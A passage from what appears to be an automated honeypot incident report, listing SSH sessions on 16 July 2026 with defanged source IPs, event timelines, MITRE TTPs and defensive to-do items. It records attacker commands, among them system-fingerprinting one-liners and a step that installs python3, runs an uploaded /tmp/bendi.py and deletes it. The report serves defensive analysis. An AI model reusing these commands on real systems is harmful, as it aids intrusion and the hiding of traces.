- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-114e904351a1

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-16 05:11 |
| **Last Seen** | 2026-07-16 05:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:11:22` | `cowrie.session.connect` |
| `2026-07-16 05:11:23` | `cowrie.client.version` |
| `2026-07-16 05:11:23` | `cowrie.client.kex` |
| `2026-07-16 05:11:23` | `cowrie.login.success` |
| `2026-07-16 05:11:24` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d149dd3a2e9e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-16 05:12 |
| **Last Seen** | 2026-07-16 05:13 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:12:55` | `cowrie.session.connect` |
| `2026-07-16 05:12:56` | `cowrie.client.version` |
| `2026-07-16 05:12:56` | `cowrie.client.kex` |
| `2026-07-16 05:13:21` | `cowrie.login.success` |
| `2026-07-16 05:13:28` | `cowrie.session.params` |
| `2026-07-16 05:13:28` | `cowrie.command.input` |
| `2026-07-16 05:13:28` | `cowrie.command.input` |
| `2026-07-16 05:13:28` | `cowrie.command.input` |
| `2026-07-16 05:13:28` | `cowrie.command.input` |
| `2026-07-16 05:13:28` | `cowrie.command.input` |
| `2026-07-16 05:13:28` | `cowrie.command.success` |
| `2026-07-16 05:13:28` | `cowrie.command.input` |
| `2026-07-16 05:13:28` | `cowrie.command.input` |
| `2026-07-16 05:13:28` | `cowrie.command.input` |
| `2026-07-16 05:13:28` | `cowrie.command.input` |
| `2026-07-16 05:13:32` | `cowrie.log.closed` |
| `2026-07-16 05:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d99eb794046

| Field | Detail |
|---|---|
| **Source IP** | `185.255.212[.]178` |
| **First Seen** | 2026-07-16 05:14 |
| **Last Seen** | 2026-07-16 05:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:14:44` | `cowrie.session.connect` |
| `2026-07-16 05:14:45` | `cowrie.client.version` |
| `2026-07-16 05:14:45` | `cowrie.client.kex` |
| `2026-07-16 05:14:47` | `cowrie.login.success` |
| `2026-07-16 05:14:48` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.212[.]178` to AbuseIPDB if not already reported
- [ ] Block `185.255.212[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-643a0581cf59

| Field | Detail |
|---|---|
| **Source IP** | `36.135.62[.]103` |
| **First Seen** | 2026-07-16 05:14 |
| **Last Seen** | 2026-07-16 05:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:14:53` | `cowrie.session.connect` |
| `2026-07-16 05:14:54` | `cowrie.client.version` |
| `2026-07-16 05:14:54` | `cowrie.client.kex` |
| `2026-07-16 05:14:56` | `cowrie.login.success` |
| `2026-07-16 05:14:57` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.135.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `36.135.62[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d6be11b07b

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-16 05:15 |
| **Last Seen** | 2026-07-16 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:15:21` | `cowrie.session.connect` |
| `2026-07-16 05:15:21` | `cowrie.client.version` |
| `2026-07-16 05:15:21` | `cowrie.client.kex` |
| `2026-07-16 05:15:22` | `cowrie.login.success` |
| `2026-07-16 05:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fc23d1f8387

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-16 05:15 |
| **Last Seen** | 2026-07-16 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:15:22` | `cowrie.session.connect` |
| `2026-07-16 05:15:22` | `cowrie.client.version` |
| `2026-07-16 05:15:22` | `cowrie.client.kex` |
| `2026-07-16 05:15:23` | `cowrie.login.success` |
| `2026-07-16 05:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cae24c23f5d

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-16 05:15 |
| **Last Seen** | 2026-07-16 05:17 |
| **Session Duration** | 132s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:15:43` | `cowrie.session.connect` |
| `2026-07-16 05:15:43` | `cowrie.client.version` |
| `2026-07-16 05:15:43` | `cowrie.client.kex` |
| `2026-07-16 05:15:44` | `cowrie.login.success` |
| `2026-07-16 05:15:46` | `cowrie.session.file_upload` |
| `2026-07-16 05:15:47` | `cowrie.session.params` |
| `2026-07-16 05:15:47` | `cowrie.command.input` |
| `2026-07-16 05:15:47` | `cowrie.command.input` |
| `2026-07-16 05:15:47` | `cowrie.command.input` |
| `2026-07-16 05:15:47` | `cowrie.command.failed` |
| `2026-07-16 05:15:47` | `cowrie.log.closed` |
| `2026-07-16 05:15:48` | `cowrie.session.params` |
| `2026-07-16 05:15:48` | `cowrie.command.input` |
| `2026-07-16 05:15:48` | `cowrie.log.closed` |
| `2026-07-16 05:15:49` | `cowrie.session.params` |
| `2026-07-16 05:15:49` | `cowrie.command.input` |
| `2026-07-16 05:15:50` | `cowrie.log.closed` |
| `2026-07-16 05:15:51` | `cowrie.session.params` |
| `2026-07-16 05:15:51` | `cowrie.command.input` |
| `2026-07-16 05:15:51` | `cowrie.command.failed` |
| `2026-07-16 05:15:51` | `cowrie.command.failed` |
| `2026-07-16 05:16:52` | `cowrie.session.params` |
| `2026-07-16 05:16:52` | `cowrie.command.input` |
| `2026-07-16 05:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebde2b4bf736

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-16 05:15 |
| **Last Seen** | 2026-07-16 05:16 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:15:51` | `cowrie.session.connect` |
| `2026-07-16 05:15:52` | `cowrie.client.version` |
| `2026-07-16 05:15:52` | `cowrie.client.kex` |
| `2026-07-16 05:15:57` | `cowrie.login.success` |
| `2026-07-16 05:16:00` | `cowrie.session.params` |
| `2026-07-16 05:16:00` | `cowrie.command.input` |
| `2026-07-16 05:16:00` | `cowrie.command.input` |
| `2026-07-16 05:16:00` | `cowrie.command.input` |
| `2026-07-16 05:16:00` | `cowrie.command.input` |
| `2026-07-16 05:16:00` | `cowrie.command.input` |
| `2026-07-16 05:16:00` | `cowrie.command.success` |
| `2026-07-16 05:16:00` | `cowrie.command.input` |
| `2026-07-16 05:16:00` | `cowrie.command.input` |
| `2026-07-16 05:16:00` | `cowrie.command.input` |
| `2026-07-16 05:16:00` | `cowrie.command.input` |
| `2026-07-16 05:16:02` | `cowrie.log.closed` |
| `2026-07-16 05:16:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed2828625f6e

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-16 05:18 |
| **Last Seen** | 2026-07-16 05:20 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:18:10` | `cowrie.session.connect` |
| `2026-07-16 05:18:10` | `cowrie.client.version` |
| `2026-07-16 05:18:11` | `cowrie.client.kex` |
| `2026-07-16 05:18:12` | `cowrie.login.success` |
| `2026-07-16 05:18:14` | `cowrie.session.file_upload` |
| `2026-07-16 05:18:15` | `cowrie.session.params` |
| `2026-07-16 05:18:15` | `cowrie.command.input` |
| `2026-07-16 05:18:15` | `cowrie.command.input` |
| `2026-07-16 05:18:15` | `cowrie.command.input` |
| `2026-07-16 05:18:15` | `cowrie.command.failed` |
| `2026-07-16 05:18:15` | `cowrie.log.closed` |
| `2026-07-16 05:18:16` | `cowrie.session.params` |
| `2026-07-16 05:18:16` | `cowrie.command.input` |
| `2026-07-16 05:18:16` | `cowrie.log.closed` |
| `2026-07-16 05:18:17` | `cowrie.session.params` |
| `2026-07-16 05:18:17` | `cowrie.command.input` |
| `2026-07-16 05:18:18` | `cowrie.log.closed` |
| `2026-07-16 05:18:18` | `cowrie.session.params` |
| `2026-07-16 05:18:18` | `cowrie.command.input` |
| `2026-07-16 05:18:18` | `cowrie.command.failed` |
| `2026-07-16 05:18:18` | `cowrie.command.failed` |
| `2026-07-16 05:19:20` | `cowrie.session.params` |
| `2026-07-16 05:19:20` | `cowrie.command.input` |
| `2026-07-16 05:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1539388434b5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-16 05:19 |
| **Last Seen** | 2026-07-16 05:19 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:19:14` | `cowrie.session.connect` |
| `2026-07-16 05:19:16` | `cowrie.client.version` |
| `2026-07-16 05:19:16` | `cowrie.client.kex` |
| `2026-07-16 05:19:29` | `cowrie.login.success` |
| `2026-07-16 05:19:33` | `cowrie.session.params` |
| `2026-07-16 05:19:33` | `cowrie.command.input` |
| `2026-07-16 05:19:33` | `cowrie.command.input` |
| `2026-07-16 05:19:33` | `cowrie.command.input` |
| `2026-07-16 05:19:33` | `cowrie.command.input` |
| `2026-07-16 05:19:33` | `cowrie.command.input` |
| `2026-07-16 05:19:33` | `cowrie.command.success` |
| `2026-07-16 05:19:33` | `cowrie.command.input` |
| `2026-07-16 05:19:33` | `cowrie.command.input` |
| `2026-07-16 05:19:33` | `cowrie.command.input` |
| `2026-07-16 05:19:33` | `cowrie.command.input` |
| `2026-07-16 05:19:35` | `cowrie.log.closed` |
| `2026-07-16 05:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5869ff3a2759

| Field | Detail |
|---|---|
| **Source IP** | `43.248.213[.]232` |
| **First Seen** | 2026-07-16 05:19 |
| **Last Seen** | 2026-07-16 05:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:19:42` | `cowrie.session.connect` |
| `2026-07-16 05:19:42` | `cowrie.client.version` |
| `2026-07-16 05:19:42` | `cowrie.client.kex` |
| `2026-07-16 05:19:44` | `cowrie.login.success` |
| `2026-07-16 05:19:45` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.248.213[.]232` to AbuseIPDB if not already reported
- [ ] Block `43.248.213[.]232` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5b6a20687dd

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-07-16 05:19 |
| **Last Seen** | 2026-07-16 05:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:19:51` | `cowrie.session.connect` |
| `2026-07-16 05:19:52` | `cowrie.client.version` |
| `2026-07-16 05:19:52` | `cowrie.client.kex` |
| `2026-07-16 05:19:54` | `cowrie.login.success` |
| `2026-07-16 05:19:55` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-077cc2805c02

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-16 05:22 |
| **Last Seen** | 2026-07-16 05:22 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:22:38` | `cowrie.session.connect` |
| `2026-07-16 05:22:39` | `cowrie.client.version` |
| `2026-07-16 05:22:39` | `cowrie.client.kex` |
| `2026-07-16 05:22:47` | `cowrie.login.success` |
| `2026-07-16 05:22:51` | `cowrie.session.params` |
| `2026-07-16 05:22:51` | `cowrie.command.input` |
| `2026-07-16 05:22:51` | `cowrie.command.input` |
| `2026-07-16 05:22:51` | `cowrie.command.input` |
| `2026-07-16 05:22:51` | `cowrie.command.input` |
| `2026-07-16 05:22:51` | `cowrie.command.input` |
| `2026-07-16 05:22:51` | `cowrie.command.success` |
| `2026-07-16 05:22:51` | `cowrie.command.input` |
| `2026-07-16 05:22:51` | `cowrie.command.input` |
| `2026-07-16 05:22:51` | `cowrie.command.input` |
| `2026-07-16 05:22:51` | `cowrie.command.input` |
| `2026-07-16 05:22:53` | `cowrie.log.closed` |
| `2026-07-16 05:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed10f3f65a81

| Field | Detail |
|---|---|
| **Source IP** | `103.230.176[.]152` |
| **First Seen** | 2026-07-16 05:23 |
| **Last Seen** | 2026-07-16 05:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:23:12` | `cowrie.session.connect` |
| `2026-07-16 05:23:12` | `cowrie.client.version` |
| `2026-07-16 05:23:12` | `cowrie.client.kex` |
| `2026-07-16 05:23:14` | `cowrie.login.success` |
| `2026-07-16 05:23:15` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.230.176[.]152` to AbuseIPDB if not already reported
- [ ] Block `103.230.176[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7ddb20e2f86

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]236` |
| **First Seen** | 2026-07-16 05:23 |
| **Last Seen** | 2026-07-16 05:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:23:21` | `cowrie.session.connect` |
| `2026-07-16 05:23:21` | `cowrie.client.version` |
| `2026-07-16 05:23:21` | `cowrie.client.kex` |
| `2026-07-16 05:23:23` | `cowrie.login.success` |
| `2026-07-16 05:23:24` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]236` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8450a25d7fe

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-16 05:25 |
| **Last Seen** | 2026-07-16 05:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:25:36` | `cowrie.session.connect` |
| `2026-07-16 05:25:37` | `cowrie.client.version` |
| `2026-07-16 05:25:37` | `cowrie.client.kex` |
| `2026-07-16 05:25:42` | `cowrie.login.success` |
| `2026-07-16 05:25:44` | `cowrie.session.params` |
| `2026-07-16 05:25:44` | `cowrie.command.input` |
| `2026-07-16 05:25:44` | `cowrie.command.input` |
| `2026-07-16 05:25:44` | `cowrie.command.input` |
| `2026-07-16 05:25:44` | `cowrie.command.input` |
| `2026-07-16 05:25:44` | `cowrie.command.input` |
| `2026-07-16 05:25:44` | `cowrie.command.success` |
| `2026-07-16 05:25:44` | `cowrie.command.input` |
| `2026-07-16 05:25:44` | `cowrie.command.input` |
| `2026-07-16 05:25:44` | `cowrie.command.input` |
| `2026-07-16 05:25:44` | `cowrie.command.input` |
| `2026-07-16 05:25:46` | `cowrie.log.closed` |
| `2026-07-16 05:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-362662b6570a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 05:25 |
| **Last Seen** | 2026-07-16 05:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:25:42` | `cowrie.session.connect` |
| `2026-07-16 05:25:42` | `cowrie.client.version` |
| `2026-07-16 05:25:42` | `cowrie.client.kex` |
| `2026-07-16 05:25:42` | `cowrie.login.success` |
| `2026-07-16 05:25:43` | `cowrie.session.params` |
| `2026-07-16 05:25:43` | `cowrie.command.input` |
| `2026-07-16 05:25:43` | `cowrie.log.closed` |
| `2026-07-16 05:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-089fcbb6e5ab

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-16 05:28 |
| **Last Seen** | 2026-07-16 05:28 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:28:13` | `cowrie.session.connect` |
| `2026-07-16 05:28:14` | `cowrie.client.version` |
| `2026-07-16 05:28:14` | `cowrie.client.kex` |
| `2026-07-16 05:28:23` | `cowrie.login.success` |
| `2026-07-16 05:28:27` | `cowrie.session.params` |
| `2026-07-16 05:28:27` | `cowrie.command.input` |
| `2026-07-16 05:28:27` | `cowrie.command.input` |
| `2026-07-16 05:28:27` | `cowrie.command.input` |
| `2026-07-16 05:28:27` | `cowrie.command.input` |
